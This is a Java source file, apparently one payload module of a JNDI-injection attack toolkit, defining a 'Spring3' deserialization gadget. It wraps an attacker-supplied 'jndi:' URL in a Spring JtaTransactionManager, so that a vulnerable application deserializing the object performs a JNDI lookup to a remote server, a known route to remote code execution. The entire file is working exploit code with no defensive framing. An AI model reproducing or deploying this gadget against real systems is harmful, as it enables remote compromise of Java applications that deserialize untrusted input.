package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.annotation.Dependencies;
import org.springframework.transaction.jta.JtaTransactionManager;

@Dependencies({"org.springframework:spring-tx:5.2.3.RELEASE", "org.springframework:spring-context:5.2.3.RELEASE", "javax.transaction:javax.transaction-api:1.2"})
public class Spring3 implements ObjectPayload<Object>{
    @Override
    public Object getObject(PayloadType type, String... param) throws Exception {
        String command = param[0];
        String jndiURL = null;
        if (command.toLowerCase().startsWith("jndi:")) {
            jndiURL = command.substring(5);
        } else {
            throw new Exception(String.format("Command [%s] not supported", command));
        }

        JtaTransactionManager manager = new JtaTransactionManager();
        manager.setUserTransactionName(jndiURL);
        return manager;
    }
}
